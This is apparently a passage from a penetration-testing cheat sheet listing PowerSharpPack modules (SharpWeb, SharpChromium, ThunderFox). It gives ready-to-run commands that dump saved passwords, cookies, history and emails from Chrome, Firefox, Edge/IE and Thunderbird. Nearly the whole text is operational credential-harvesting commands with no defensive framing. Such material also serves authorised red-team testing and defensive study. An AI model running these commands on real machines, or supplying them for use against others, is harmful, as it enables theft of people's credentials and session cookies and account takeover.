**SharpWeb**  
Retrieves saved browser credentials from Google Chrome, Mozilla Firefox, and Microsoft Internet Explorer/Edge.  
@Credit to: https://github.com/djhohnstein/SharpWeb  
```bash
PowerSharpPack -SharpWeb -Command "all"
PowerSharpPack -SharpWeb -Command "passwords"
PowerSharpPack -SharpWeb -Command "cookies"
```

**SharpChromium**  
Retrieves Chromium data, including cookies, history, and saved logins.  
@Credit to: https://github.com/djhohnstein/SharpChromium  
```bash
PowerSharpPack -SharpChromium -Command "all"
PowerSharpPack -SharpChromium -Command "passwords"
PowerSharpPack -SharpChromium -Command "cookies"
```

**ThunderFox**  
Retrieves data (contacts, emails, history, cookies, and credentials) from Thunderbird and Firefox.  
@Credit to: https://github.com/V1V1/SharpScribbles  
```bash
PowerSharpPack -ThunderFox -Command "retrieve"
PowerSharpPack -ThunderFox -Command "cookies"
```
